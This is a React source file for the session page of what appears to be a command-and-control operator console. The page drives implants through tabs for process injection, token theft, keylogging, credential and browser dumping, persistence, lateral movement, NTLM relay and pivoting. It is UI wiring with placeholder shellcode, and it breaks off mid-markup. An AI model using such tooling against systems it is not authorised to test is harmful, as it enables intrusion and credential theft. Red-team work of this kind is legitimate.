import { useEffect, useState, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { useQuery, useQueryClient } from '@tanstack/react-query';
import {
  implantClient,
  taskClient,
  collabClient,
  proxyClient,
  meshClient,
  injectClient,
  LockSessionRequest,
  UnlockSessionRequest,
  StartProxyRequest,
  StopProxyRequest,
  StartPortForwardRequest,
  StopPortForwardRequest,
  SocksVersion,
  MeshTransportType,
  MeshRoleType,
} from '../api';
import type { PeerConnectionRequest } from '../components/mesh/types';
import type { MeshRole } from '../components/mesh/types';
import {
  ImplantState,
  ShellResult,
  InjectRequest,
  InjectionMethod,
  TokenTask,
  TokenList,
  TokenSteal,
  TokenMake,
  TokenRevSelf,
} from '../gen/kraken_pb.js';
import type { TaskInfo } from '../gen/kraken_pb.js';
import { useSessionStore, type SessionTab } from '../stores/sessionStore';
import { useCollab } from '../contexts/CollabContext';
import { useAuthStore } from '../stores/authStore';
import { SessionInfoSidebar } from '../components/session/SessionInfoSidebar';
import { Terminal } from '../components/session/Terminal';
import { CommandInput, type CommandInputHandle } from '../components/session/CommandInput';
import { SessionTabs } from '../components/session/SessionTabs';
import { FileBrowser } from '../components/session/FileBrowser';
import { useRegisterShortcut } from '../contexts/KeyboardShortcutsContext';
import { MeshControlPanel } from '../components/mesh';
import { SocksProxyManager } from '../components/proxy';
import { BOFExecutionPanel } from '../components/bof/BOFExecutionPanel';
import { BOF_CATALOG } from '../components/bof/catalog';
import { ProcessBrowser } from '../components/process/ProcessBrowser';
import { KeylogPanel } from '../components/session/KeylogPanel';
import { ClipboardPanel } from '../components/session/ClipboardPanel';
import { EnvironmentPanel } from '../components/session/EnvironmentPanel';
import { ScanPanel } from '../components/session/ScanPanel';
import { PersistencePanel } from '../components/session/PersistencePanel';
import { RegistryBrowser } from '../components/session/RegistryBrowser';
import { LateralPanel } from '../components/session/LateralPanel';
import { ADPanel } from '../components/session/ADPanel';
import { CredentialPanel } from '../components/session/CredentialPanel';
import { BrowserDumpPanel } from '../components/session/BrowserDumpPanel';
import { ServiceManager } from '../components/session/ServiceManager';
import { MediaCapturePanel } from '../components/session/MediaCapturePanel';
import { USBMonitorPanel } from '../components/session/USBMonitorPanel';
import { RDPHijackPanel } from '../components/session/RDPHijackPanel';
import { NTLMRelayPanel } from '../components/session/NTLMRelayPanel';
import { PortForwardPanel } from '../components/session/PortForwardPanel';
import { OpsecGate } from '../components/opsec/OpsecGate';
import { RiskBadge } from '../components/opsec/RiskIndicator';
import { assessInjectionTechnique, assessTaskRisk, type InjectionTechnique } from '../components/opsec/types';

function hexToUint8Array(hex: string): Uint8Array<ArrayBuffer> {
  const buffer = new ArrayBuffer(hex.length / 2);
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

function uuidToHex(uuid: { value: Uint8Array } | undefined): string {
  if (!uuid?.value) return '';
  return Array.from(uuid.value).map(b => b.toString(16).padStart(2, '0')).join('');
}

function mapImplantState(state: ImplantState): SessionTab['state'] {
  switch (state) {
    case ImplantState.ACTIVE: return 'active';
    case ImplantState.LOST: return 'dormant';
    case ImplantState.BURNED: return 'burned';
    default: return 'dead';
  }
}

function hexToUint8ArrayLocal(hex: string): Uint8Array<ArrayBuffer> {
  const buffer = new ArrayBuffer(hex.length / 2);
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

export function SessionDetail() {
  const { sessionId } = useParams<{ sessionId: string }>();
  const navigate = useNavigate();
  const queryClient = useQueryClient();
  const { openSession, openTabs } = useSessionStore();
  const [activeTab, setActiveTab] = useState<'terminal' | 'tasks' | 'files' | 'mesh' | 'pivot' | 'bof' | 'process' | 'inject' | 'token' | 'keylog' | 'clipboard' | 'env' | 'scan' | 'persist' | 'registry' | 'lateral' | 'ad' | 'creds' | 'browser' | 'services' | 'media' | 'usb' | 'rdp' | 'ntlm' | 'portfwd'>('terminal');
  const { state: collabState } = useCollab();
  const operator = useAuthStore((s) => s.operator);
  const [lockBannerDismissed, setLockBannerDismissed] = useState(false);
  const [lockLoading, setLockLoading] = useState(false);
  const [lockError, setLockError] = useState<string | null>(null);

  const commandInputRef = useRef<CommandInputHandle>(null);
  const [clearTimestamp, setClearTimestamp] = useState<number>(0);

  // State for process injection
  const [selectedPid, setSelectedPid] = useState<number | null>(null);
  const [selectedProcessName, setSelectedProcessName] = useState<string>('');
  const [injectError, setInjectError] = useState<string | null>(null);
  const [injectSuccess, setInjectSuccess] = useState<string | null>(null);

  // State for token manipulation
  const [tokenError, setTokenError] = useState<string | null>(null);
  const [tokenSuccess, setTokenSuccess] = useState<string | null>(null);
  const [tokenLoading, setTokenLoading] = useState(false);
  const [showStealDialog, setShowStealDialog] = useState(false);
  const [showMakeDialog, setShowMakeDialog] = useState(false);
  const [stealPid, setStealPid] = useState('');
  const [makeUsername, setMakeUsername] = useState('');
  const [makePassword, setMakePassword] = useState('');
  const [makeDomain, setMakeDomain] = useState('.');

  // OPSEC gate state for inject tab
  const [injectGate, setInjectGate] = useState<{
    open: boolean;
    technique: InjectionTechnique | null;
    pendingAction: (() => void) | null;
  }>({ open: false, technique: null, pendingAction: null });

  function openInjectGate(technique: InjectionTechnique, action: () => void) {
    setInjectGate({ open: true, technique, pendingAction: action });
  }

  function closeInjectGate() {
    setInjectGate({ open: false, technique: null, pendingAction: null });
  }

  function confirmInjectGate() {
    injectGate.pendingAction?.();
    closeInjectGate();
  }

  // Map InjectionTechnique to protobuf InjectionMethod enum
  function getTechniqueMethod(technique: InjectionTechnique): InjectionMethod {
    switch (technique) {
      case 'auto': return InjectionMethod.AUTO;
      case 'win32': return InjectionMethod.WIN32;
      case 'ntapi': return InjectionMethod.NT_API;
      case 'apc': return InjectionMethod.APC;
      case 'thread_hijack': return InjectionMethod.THREAD_HIJACK;
      default: return InjectionMethod.AUTO;
    }
  }

  // Perform process injection
  async function performInjection(technique: InjectionTechnique) {
    if (!sessionId) {
      setInjectError('No session ID available');
      return;
    }

    if (!selectedPid) {
      setInjectError('Please select a target process from the Process tab first');
      return;
    }

    setInjectError(null);
    setInjectSuccess(null);

    try {
      // For now, use a placeholder shellcode (in production, this would come from file upload or payload generation)
      // This is a simple example - real implementation would need actual shellcode
      const placeholderShellcode = new Uint8Array([0x90, 0x90, 0x90, 0xc3]); // NOP NOP NOP RET

      const response = await injectClient.inject(
        new InjectRequest({
          implantId: { value: hexToUint8Array(sessionId) },
          targetPid: selectedPid,
          shellcode: placeholderShellcode,
          method: getTechniqueMethod(technique),
          waitForCompletion: true,
          timeoutMs: 30000,
        })
      );

      if (response.success) {
        const msg = `Successfully injected into PID ${selectedPid} (${selectedProcessName}) using ${technique}`;
        setInjectSuccess(msg);
        console.log(msg, response);
      } else {
        const errMsg = response.error || 'Injection failed';
        setInjectError(errMsg);
        console.error('Injection failed:', errMsg);
      }
    } catch (err) {
      const errMsg = err instanceof Error ? err.message : 'Failed to inject into process';
      setInjectError(errMsg);
      console.error('Injection error:', err);
    }
  }

  // Ctrl+/ (or Cmd+/): focus the terminal input
  useRegisterShortcut('ctrl+/', () => {
    setActiveTab('terminal');
    // Focus happens after the tab switch renders
    setTimeout(() => commandInputRef.current?.focusInput(), 0);
  });

  // Ctrl+1 through Ctrl+9: switch to nth open session tab
  useRegisterShortcut('ctrl+1', () => { const t = openTabs[0]; if (t) navigate(`/sessions/${t.id}`); });
  useRegisterShortcut('ctrl+2', () => { const t = openTabs[1]; if (t) navigate(`/sessions/${t.id}`); });
  useRegisterShortcut('ctrl+3', () => { const t = openTabs[2]; if (t) navigate(`/sessions/${t.id}`); });
  useRegisterShortcut('ctrl+4', () => { const t = openTabs[3]; if (t) navigate(`/sessions/${t.id}`); });
  useRegisterShortcut('ctrl+5', () => { const t = openTabs[4]; if (t) navigate(`/sessions/${t.id}`); });
  useRegisterShortcut('ctrl+6', () => { const t = openTabs[5]; if (t) navigate(`/sessions/${t.id}`); });
  useRegisterShortcut('ctrl+7', () => { const t = openTabs[6]; if (t) navigate(`/sessions/${t.id}`); });
  useRegisterShortcut('ctrl+8', () => { const t = openTabs[7]; if (t) navigate(`/sessions/${t.id}`); });
  useRegisterShortcut('ctrl+9', () => { const t = openTabs[8]; if (t) navigate(`/sessions/${t.id}`); });

  // Find lock for this session
  const sessionLock = sessionId
    ? collabState.sessionLocks.find((l) => {
        if (!l.sessionId?.value) return false;
        const lockHex = Array.from(l.sessionId.value)
          .map((b) => b.toString(16).padStart(2, '0'))
          .join('');
        return lockHex === sessionId;
      })
    : undefined;

  const currentUsername = operator?.username ?? '';
  const lockedByOther = sessionLock && sessionLock.username !== currentUsername;
  const lockedByMe = sessionLock && sessionLock.username === currentUsername;

  // Re-show the banner when the lock changes to a different holder
  useEffect(() => {
    if (lockedByOther) setLockBannerDismissed(false);
  }, [sessionLock?.username, lockedByOther]);

  async function handleLock() {
    if (!sessionId) return;
    setLockLoading(true);
    setLockError(null);
    try {
      await collabClient.lockSession(
        new LockSessionRequest({ sessionId: { value: hexToUint8ArrayLocal(sessionId) } })
      );
    } catch (err) {
      setLockError(err instanceof Error ? err.message : 'Failed to lock session');
    } finally {
      setLockLoading(false);
    }
  }

  async function handleUnlock() {
    if (!sessionId) return;
    setLockLoading(true);
    setLockError(null);
    try {
      await collabClient.unlockSession(
        new UnlockSessionRequest({ sessionId: { value: hexToUint8ArrayLocal(sessionId) } })
      );
    } catch (err) {
      setLockError(err instanceof Error ? err.message : 'Failed to unlock session');
    } finally {
      setLockLoading(false);
    }
  }

  // Fetch session/implant details
  const { data: implant, isLoading: implantLoading, error: implantError } = useQuery({
    queryKey: ['implant', sessionId],
    queryFn: async () => {
      if (!sessionId) return null;
      const implant = await implantClient.getImplant({
        implantId: { value: hexToUint8Array(sessionId) },
      });
      return implant;
    },
    enabled: !!sessionId,
  });

  // Fetch tasks for this session
  const { data: tasks, isLoading: tasksLoading } = useQuery({
    queryKey: ['tasks', sessionId],
    queryFn: async () => {
      if (!sessionId) return [];
      const response = await taskClient.listTasks({
        implantId: { value: hexToUint8Array(sessionId) },
        limit: 100,
      });
      return response.tasks ?? [];
    },
    refetchInterval: 2000,
    enabled: !!sessionId,
  });

  // Fetch proxies for this session
  const { data: proxiesData } = useQuery({
    queryKey: ['proxies', sessionId],
    queryFn: async () => {
      if (!sessionId) return { proxies: [], portForwards: [] };
      const response = await proxyClient.listProxies({
        implantId: { value: hexToUint8Array(sessionId) },
      });
      return {
        proxies: response.proxies ?? [],
        portForwards: response.portForwards ?? [],
      };
    },
    refetchInterval: 3000,
    enabled: !!sessionId,
  });

  // Proxy/port forward handlers - using local component types
  const handleCreateProxy = async (request: import('../components/proxy/types').CreateProxyRequest) => {
    await proxyClient.startProxy(
      new StartProxyRequest({
        implantId: { value: hexToUint8Array(request.sessionId) },
        bindHost: request.bindHost || '127.0.0.1',
        bindPort: request.bindPort,
        version: request.version === 'socks5' ? SocksVersion.SOCKS_VERSION_5 : SocksVersion.SOCKS_VERSION_4,
      })
    );
    queryClient.invalidateQueries({ queryKey: ['proxies', sessionId] });
  };

  const handleStopProxy = async (proxyId: string) => {
    await proxyClient.stopProxy(
      new StopProxyRequest({
        proxyId: { value: hexToUint8Array(proxyId) },
      })
    );
    queryClient.invalidateQueries({ queryKey: ['proxies', sessionId] });
  };

  const handleCreatePortForward = async (request: import('../components/proxy/types').CreatePortForwardRequest) => {
    await proxyClient.startPortForward(
      new StartPortForwardRequest({
        implantId: { value: hexToUint8Array(request.sessionId) },
        localHost: request.localHost,
        localPort: request.localPort,
        remoteHost: request.remoteHost,
        remotePort: request.remotePort,
        reverse: request.direction === 'remote',
      })
    );
    queryClient.invalidateQueries({ queryKey: ['proxies', sessionId] });
  };

  const handleStopPortForward = async (forwardId: string) => {
    await proxyClient.stopPortForward(
      new StopPortForwardRequest({
        forwardId: { value: hexToUint8Array(forwardId) },
      })
    );
    queryClient.invalidateQueries({ queryKey: ['proxies', sessionId] });
  };

  // Token manipulation handlers
  const handleListTokens = async () => {
    setTokenLoading(true);
    setTokenError(null);
    setTokenSuccess(null);
    try {
      const tokenTask = new TokenTask({
        operation: {
          case: 'list',
          value: new TokenList(),
        },
      });

      await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId!) },
        taskType: 'token',
        taskData: tokenTask.toBinary() as Uint8Array<ArrayBuffer>,
      });

      setTokenSuccess('Token list task dispatched. Check tasks tab for results.');
      queryClient.invalidateQueries({ queryKey: ['tasks', sessionId] });
    } catch (err) {
      setTokenError(err instanceof Error ? err.message : 'Failed to list tokens');
    } finally {
      setTokenLoading(false);
    }
  };

  const handleStealToken = async () => {
    if (!stealPid || isNaN(parseInt(stealPid))) {
      setTokenError('Invalid PID');
      return;
    }

    setTokenLoading(true);
    setTokenError(null);
    setTokenSuccess(null);
    try {
      const tokenTask = new TokenTask({
        operation: {
          case: 'steal',
          value: new TokenSteal({ targetPid: parseInt(stealPid) }),
        },
      });

      await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId!) },
        taskType: 'token',
        taskData: tokenTask.toBinary() as Uint8Array<ArrayBuffer>,
      });

      setTokenSuccess(`Token steal task dispatched for PID ${stealPid}`);
      setShowStealDialog(false);
      setStealPid('');
      queryClient.invalidateQueries({ queryKey: ['tasks', sessionId] });
    } catch (err) {
      setTokenError(err instanceof Error ? err.message : 'Failed to steal token');
    } finally {
      setTokenLoading(false);
    }
  };

  const handleMakeToken = async () => {
    if (!makeUsername || !makePassword) {
      setTokenError('Username and password are required');
      return;
    }

    setTokenLoading(true);
    setTokenError(null);
    setTokenSuccess(null);
    try {
      const tokenTask = new TokenTask({
        operation: {
          case: 'make',
          value: new TokenMake({
            username: makeUsername,
            password: makePassword,
            domain: makeDomain || '.',
          }),
        },
      });

      await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId!) },
        taskType: 'token',
        taskData: tokenTask.toBinary() as Uint8Array<ArrayBuffer>,
      });

      setTokenSuccess(`Token make task dispatched for ${makeDomain}\\${makeUsername}`);
      setShowMakeDialog(false);
      setMakeUsername('');
      setMakePassword('');
      setMakeDomain('.');
      queryClient.invalidateQueries({ queryKey: ['tasks', sessionId] });
    } catch (err) {
      setTokenError(err instanceof Error ? err.message : 'Failed to make token');
    } finally {
      setTokenLoading(false);
    }
  };

  // Note: handleImpersonate would be used when displaying a token list with selectable tokens
  // Currently tokens are viewed via task results in the tasks tab
  // Uncomment and wire up when adding live token list display
  /*
  const handleImpersonate = async (tokenId: number) => {
    setTokenLoading(true);
    setTokenError(null);
    setTokenSuccess(null);
    try {
      const tokenTask = new TokenTask({
        operation: {
          case: 'impersonate',
          value: new TokenImpersonate({ tokenId }),
        },
      });

      await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId!) },
        taskType: 'token',
        taskData: tokenTask.toBinary() as Uint8Array<ArrayBuffer>,
      });

      setTokenSuccess(`Impersonation task dispatched for token ${tokenId}`);
      queryClient.invalidateQueries({ queryKey: ['tasks', sessionId] });
    } catch (err) {
      setTokenError(err instanceof Error ? err.message : 'Failed to impersonate');
    } finally {
      setTokenLoading(false);
    }
  };
  */

  const handleRevertToSelf = async () => {
    setTokenLoading(true);
    setTokenError(null);
    setTokenSuccess(null);
    try {
      const tokenTask = new TokenTask({
        operation: {
          case: 'rev2self',
          value: new TokenRevSelf(),
        },
      });

      await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId!) },
        taskType: 'token',
        taskData: tokenTask.toBinary() as Uint8Array<ArrayBuffer>,
      });

      setTokenSuccess('Revert to self task dispatched');
      queryClient.invalidateQueries({ queryKey: ['tasks', sessionId] });
    } catch (err) {
      setTokenError(err instanceof Error ? err.message : 'Failed to revert to self');
    } finally {
      setTokenLoading(false);
    }
  };

  // Stream task results for live updates
  useEffect(() => {
    if (!sessionId) return;
    const abortController = new AbortController();

    async function streamResults() {
      try {
        const stream = taskClient.streamTaskResults({
          implantId: { value: hexToUint8Array(sessionId!) },
        }, { signal: abortController.signal });
        for await (const _event of stream) {
          if (abortController.signal.aborted) break;
          queryClient.invalidateQueries({ queryKey: ['tasks', sessionId] });
        }
      } catch (err) {
        // Ignore abort errors (expected on navigation/unmount)
        if (abortController.signal.aborted) return;
        console.error('TaskResult stream error:', err);
      }
    }

    streamResults();
    return () => { abortController.abort(); };
  }, [sessionId, queryClient]);

  // Add to open tabs when visiting
  useEffect(() => {
    if (implant && sessionId) {
      const tab: SessionTab = {
        id: sessionId,
        hostname: implant.systemInfo?.hostname ?? 'Unknown',
        username: implant.systemInfo?.username ?? '',
        state: mapImplantState(implant.state),
      };
      openSession(tab);
    }
  }, [implant, sessionId, openSession]);

  // Sort tasks chronologically (oldest first for terminal feel)
  const sortedTasks = tasks ? [...tasks].sort((a, b) => {
    const ta = a.issuedAt ? Number(a.issuedAt.millis) : 0;
    const tb = b.issuedAt ? Number(b.issuedAt.millis) : 0;
    return ta - tb;
  }) : [];

  // Filter tasks to only show those issued after the last clear
  const visibleTasks = clearTimestamp === 0
    ? sortedTasks
    : sortedTasks.filter(t => t.issuedAt ? Number(t.issuedAt.millis) > clearTimestamp : false);

  if (!sessionId) {
    return (
      <div className="flex items-center justify-center h-full">
        <p className="text-ctp-subtext0">No session selected</p>
      </div>
    );
  }

  if (implantLoading) {
    return (
      <div className="flex items-center justify-center h-full">
        <p className="text-ctp-subtext0">Loading session...</p>
      </div>
    );
  }

  if (implantError || !implant) {
    return (
      <div className="flex flex-col items-center justify-center h-full gap-4">
        <p className="text-ctp-red">Failed to load session</p>
        <button
          onClick={() => navigate('/sessions')}
          className="px-4 py-2 bg-ctp-surface0 hover:bg-ctp-surface1 rounded-lg text-sm"
        >
          Back to Sessions
        </button>
      </div>
    );
  }

  return (
    <div className="flex flex-col h-full">
      {/* Lock warning banner */}
      {lockedByOther && !lockBannerDismissed && (
        <div className="flex items-center justify-between px-4 py-2 bg-ctp-yellow/15 border border-ctp-yellow/40 rounded-lg mx-0 mb-2 text-sm">
          <div className="flex items-center gap-2">
            <span className="text-ctp-yellow font-semibold">Session locked</span>
            <span className="text-ctp-text">
              by <span className="font-mono font-semibold text-ctp-peach">{sessionLock!.username}</span>
              {sessionLock!.lockedAt && (
                <span className="text-ctp-subtext0 ml-1">
                  since {new Date(Number(sessionLock!.lockedAt.millis)).toLocaleTimeString()}
                </span>
              )}
            </span>
          </div>
          <button
            onClick={() => setLockBannerDismissed(true)}
            className="ml-4 text-ctp-subtext0 hover:text-ctp-text transition-colors text-xs"
            aria-label="Dismiss"
          >
            Dismiss
          </button>
        </div>
      )}

      {/* Session tabs bar */}
      {openTabs.length > 0 && (
        <SessionTabs currentSessionId={sessionId} />
      )}

      {/* Main content */}
      <div className="flex flex-1 min-h-0 gap-4">
        {/* Left sidebar - session info */}
        <div className="flex flex-col gap-2">
          <SessionInfoSidebar
            implant={implant}
            sessionId={sessionId}
            onAction={() => {
              queryClient.invalidateQueries({ queryKey: ['implant', sessionId] });
            }}
          />
          {/* Lock / Unlock controls */}
          <div className="flex flex-col gap-1 px-1">
            {lockError && (
              <div className="text-xs text-ctp-red bg-ctp-red/10 border border-ctp-red/30 rounded px-2 py-1">
                {lockError}
              </div>
            )}
            <div className="flex items-center gap-2">
              {sessionLock ? (
                <div className="flex items-center gap-2 w-full">
                  <span className="text-xs text-ctp-subtext0 flex-1">
                    {lockedByMe ? (
                      <span className="text-ctp-green">Locked by you</span>
                    ) : (
                      <span className="text-ctp-yellow">Locked by {sessionLock.username}</span>
                    )}
                  </span>
                  {lockedByMe && (
                    <button
                      onClick={handleUnlock}
                      disabled={lockLoading}
                      className="px-2 py-1 text-xs bg-ctp-surface0 hover:bg-ctp-surface1 text-ctp-text rounded transition-colors disabled:opacity-50"
                    >
                      {lockLoading ? 'Unlocking…' : 'Unlock'}
                    </button>
                  )}
                </div>
              ) : (
                <button
                  onClick={handleLock}
                  disabled={lockLoading}
                  className="px-2 py-1 text-xs bg-ctp-surface0 hover:bg-ctp-surface1 text-ctp-text rounded transition-colors disabled:opacity-50 w-full"
                >
                  {lockLoading ? 'Locking…' : 'Lock Session'}
                </button>
              )}
            </div>
          </div>
        </div>

        {/* Right main area */}
        <div className="flex-1 flex flex-col min-h-0 bg-ctp-mantle rounded-lg border border-ctp-surface0 overflow-hidden">
          {/* Tab bar */}
          <div className="flex border-b border-ctp-surface0 bg-ctp-crust">
            <TabButton
              active={activeTab === 'terminal'}
              onClick={() => setActiveTab('terminal')}
            >
              Terminal
            </TabButton>
            <TabButton
              active={activeTab === 'tasks'}
              onClick={() => setActiveTab('tasks')}
            >
              Tasks ({sortedTasks.length})
            </TabButton>
            <TabButton
              active={activeTab === 'files'}
              onClick={() => setActiveTab('files')}
            >
              Files
            </TabButton>
            <TabButton
              active={activeTab === 'mesh'}
              onClick={() => setActiveTab('mesh')}
            >
              Mesh
            </TabButton>
            <TabButton
              active={activeTab === 'pivot'}
              onClick={() => setActiveTab('pivot')}
            >
              Pivot
            </TabButton>
            <TabButton
              active={activeTab === 'bof'}
              onClick={() => setActiveTab('bof')}
            >
              BOF
            </TabButton>
            <TabButton
              active={activeTab === 'process'}
              onClick={() => setActiveTab('process')}
            >
              Process
            </TabButton>
            <TabButton
              active={activeTab === 'inject'}
              onClick={() => setActiveTab('inject')}
            >
              Inject
            </TabButton>
            <TabButton
              active={activeTab === 'token'}
              onClick={() => setActiveTab('token')}
            >
              Token
            </TabButton>
            <TabButton active={activeTab === 'keylog'} onClick={() => setActiveTab('keylog')}>Keylog</TabButton>
            <TabButton active={activeTab === 'clipboard'} onClick={() => setActiveTab('clipboard')}>Clipboard</TabButton>
            <TabButton active={activeTab === 'env'} onClick={() => setActiveTab('env')}>Env</TabButton>
            <TabButton active={activeTab === 'registry'} onClick={() => setActiveTab('registry')}>Registry</TabButton>
            <TabButton active={activeTab === 'services'} onClick={() => setActiveTab('services')}>Services</TabButton>
            <TabButton active={activeTab === 'persist'} onClick={() => setActiveTab('persist')}>Persist</TabButton>
            <TabButton active={activeTab === 'scan'} onClick={() => setActiveTab('scan')}>Scan</TabButton>
            <TabButton active={activeTab === 'lateral'} onClick={() => setActiveTab('lateral')}>Lateral</TabButton>
            <TabButton active={activeTab === 'ad'} onClick={() => setActiveTab('ad')}>AD</TabButton>
            <TabButton active={activeTab === 'creds'} onClick={() => setActiveTab('creds')}>Creds</TabButton>
            <TabButton active={activeTab === 'browser'} onClick={() => setActiveTab('browser')}>Browser</TabButton>
            <TabButton active={activeTab === 'media'} onClick={() => setActiveTab('media')}>Media</TabButton>
            <TabButton active={activeTab === 'usb'} onClick={() => setActiveTab('usb')}>USB</TabButton>
            <TabButton active={activeTab === 'rdp'} onClick={() => setActiveTab('rdp')}>RDP</TabButton>
            <TabButton active={activeTab === 'ntlm'} onClick={() => setActiveTab('ntlm')}>NTLM</TabButton>
            <TabButton active={activeTab === 'portfwd'} onClick={() => setActiveTab('portfwd')}>PortFwd</TabButton>
            <div className="flex-1" />
            <ExportButton tasks={sortedTasks} sessionId={sessionId} />
          </div>

          {/* Tab content */}
          <div className="flex-1 flex flex-col min-h-0">
            {activeTab === 'terminal' && (
              <>
                <Terminal tasks={visibleTasks} isLoading={tasksLoading} />
                <CommandInput
                  ref={commandInputRef}
                  sessionId={sessionId}
                  implant={implant}
                  onCommandSent={() => {
                    queryClient.invalidateQueries({ queryKey: ['tasks', sessionId] });
                  }}
                  onClear={() => setClearTimestamp(Date.now())}
                />
              </>
            )}

            {activeTab === 'tasks' && (
              <div className="flex-1 overflow-auto p-4">
                <TasksTable tasks={sortedTasks} sessionId={sessionId} />
              </div>
            )}

            {activeTab === 'files' && (
              <FileBrowser
                sessionId={sessionId}
                osName={implant.systemInfo?.osName}
              />
            )}

            {activeTab === 'mesh' && (
              <div className="flex-1 overflow-auto p-4">
                <MeshControlPanel
                  sessionName={implant.systemInfo?.hostname || 'Session'}
                  currentRole="leaf"
                  onConnect={async (request: PeerConnectionRequest) => {
                    if (!sessionId) return;
                    const transportEnum =
                      request.transport === 'tcp' ? MeshTransportType.MESH_TRANSPORT_TCP :
                      request.transport === 'smb' ? MeshTransportType.MESH_TRANSPORT_SMB :
                      MeshTransportType.MESH_TRANSPORT_UNKNOWN;
                    try {
                      await meshClient.connectPeer({
                        implantId: hexToUint8Array(sessionId),
                        address: request.address,
                        port: request.port,
                        transport: transportEnum,
                        pipeName: request.pipeName ?? '',
                      });
                    } catch (error) {
                      console.error('Mesh connect failed:', error);
                      throw error;
                    }
                  }}
                  onSetRole={async (role: MeshRole) => {
                    if (!sessionId) return;
                    const roleEnum =
                      role === 'egress' ? MeshRoleType.MESH_ROLE_HUB :
                      role === 'router' ? MeshRoleType.MESH_ROLE_RELAY :
                      MeshRoleType.MESH_ROLE_LEAF;
                    try {
                      await meshClient.setRole({
                        implantId: hexToUint8Array(sessionId),
                        role: roleEnum,
                      });
                    } catch (error) {
                      console.error('Mesh set role failed:', error);
                      throw error;
                    }
                  }}
                />
              </div>
            )}

            {activeTab === 'pivot' && (
              <div className="flex-1 overflow-auto p-4">
                <SocksProxyManager
                  sessionId={sessionId || ''}
                  sessionName={implant.systemInfo?.hostname || 'Session'}
                  proxies={(proxiesData?.proxies ?? []).map(p => ({
                    id: uuidToHex(p.id),
                    sessionId: sessionId || '',
                    sessionName: implant.systemInfo?.hostname || 'Session',
                    version: p.version === 3 ? 'socks5' : 'socks4' as const,
                    bindHost: p.bindHost,
                    bindPort: p.bindPort,
                    status: p.state === 2 ? 'running' : p.state === 5 ? 'error' : 'stopped' as const,
                    connections: p.activeConnections,
                    bytesIn: Number(p.bytesIn),
                    bytesOut: Number(p.bytesOut),
                    createdAt: p.startedAt?.millis ? new Date(Number(p.startedAt.millis)) : new Date(),
                  }))}
                  portForwards={(proxiesData?.portForwards ?? []).map(pf => ({
                    id: uuidToHex(pf.id),
                    sessionId: sessionId || '',
                    sessionName: implant.systemInfo?.hostname || 'Session',
                    direction: pf.reverse ? 'remote' : 'local' as const,
                    localHost: pf.localHost,
                    localPort: pf.localPort,
                    remoteHost: pf.remoteHost,
                    remotePort: pf.remotePort,
                    status: pf.state === 2 ? 'running' : pf.state === 5 ? 'error' : 'stopped' as const,
                    bytesIn: Number(pf.bytesIn),
                    bytesOut: Number(pf.bytesOut),
                    createdAt: pf.startedAt?.millis ? new Date(Number(pf.startedAt.millis)) : new Date(),
                  }))}
                  onCreateProxy={handleCreateProxy}
                  onStopProxy={handleStopProxy}
                  onCreatePortForward={handleCreatePortForward}
                  onStopPortForward={handleStopPortForward}
                />
              </div>
            )}

            {activeTab === 'bof' && (
              <div className="flex-1 overflow-hidden">
                <BOFExecutionPanel
                  sessionOs={implant.systemInfo?.osName || 'windows'}
                  sessionArch={implant.systemInfo?.osArch || 'x64'}
                  bofs={BOF_CATALOG}
                  onExecute={async (bofId, args) => {
                    // Dispatch BOF execution task
                    await taskClient.dispatchTask({
                      implantId: { value: hexToUint8Array(sessionId) },
                      taskType: 'bof',
                      taskData: new TextEncoder().encode(JSON.stringify({ bofId, args })),
                    });
                    queryClient.invalidateQueries({ queryKey: ['tasks', sessionId] });
                  }}
                />
              </div>
            )}

            {activeTab === 'process' && (
              <div className="flex-1 overflow-hidden">
                <ProcessBrowser
                  sessionId={sessionId}
                  sessionArch={implant.systemInfo?.osArch || 'x64'}
                  onInject={(pid, name) => {
                    // Switch to inject tab with selected process
                    setSelectedPid(pid);
                    setSelectedProcessName(name);
                    setInjectError(null);
                    setInjectSuccess(null);
                    setActiveTab('inject');
                  }}
                />
              </div>
            )}

            {activeTab === 'inject' && (
              <div className="flex-1 overflow-auto p-4">
                <div className="max-w-2xl mx-auto">
                  <h2 className="text-lg font-semibold text-ctp-text mb-4">Process Injection</h2>
                  <p className="text-ctp-subtext0 mb-6">
                    Inject shellcode or migrate to another process. Select a target from the Process tab first.
                  </p>
                  <div className="space-y-4">
                    {injectError && (
                      <div className="p-3 bg-ctp-red/10 border border-ctp-red rounded">
                        <p className="text-sm text-ctp-red">{injectError}</p>
                      </div>
                    )}
                    {injectSuccess && (
                      <div className="p-3 bg-ctp-green/10 border border-ctp-green rounded">
                        <p className="text-sm text-ctp-green">{injectSuccess}</p>
                      </div>
                    )}
                    {selectedPid && (
                      <div className="p-3 bg-ctp-blue/10 border border-ctp-blue rounded">
                        <p className="text-sm text-ctp-blue">
                          Target: <span className="font-mono">{selectedProcessName}</span> (PID: {selectedPid})
                        </p>
                      </div>
                    )}
                    <div className="p-4 bg-ctp-surface0 rounded-lg border border-ctp-surface1">
                      <h3 className="text-sm font-medium text-ctp-text mb-2">Injection Techniques</h3>
                      <div className="grid grid-cols-2 gap-2 text-sm">
                        {(
                          [
                            { technique: 'win32' as InjectionTechnique, label: 'CreateRemoteThread', sub: 'Classic injection' },
                            { technique: 'ntapi' as InjectionTechnique, label: 'NtCreateThreadEx', sub: 'Direct syscall' },
                            { technique: 'apc' as InjectionTechnique, label: 'QueueUserAPC', sub: 'APC injection' },
                            { technique: 'thread_hijack' as InjectionTechnique, label: 'Thread Hijacking', sub: 'Suspend/resume' },
                          ] as const
                        ).map(({ technique, label, sub }) => {
                          const assessment = assessInjectionTechnique(technique);
                          return (
                            <button
                              key={technique}
                              className="p-2 text-left rounded bg-ctp-surface1 hover:bg-ctp-surface2 transition-colors"
                              onClick={() => openInjectGate(technique, () => performInjection(technique))}
                            >
                              <div className="flex items-center justify-between mb-1">
                                <span className="text-ctp-text">{label}</span>
                                <RiskBadge level={assessment.riskLevel} />
                              </div>
                              <span className="block text-xs text-ctp-subtext0">{sub}</span>
                            </button>
                          );
                        })}
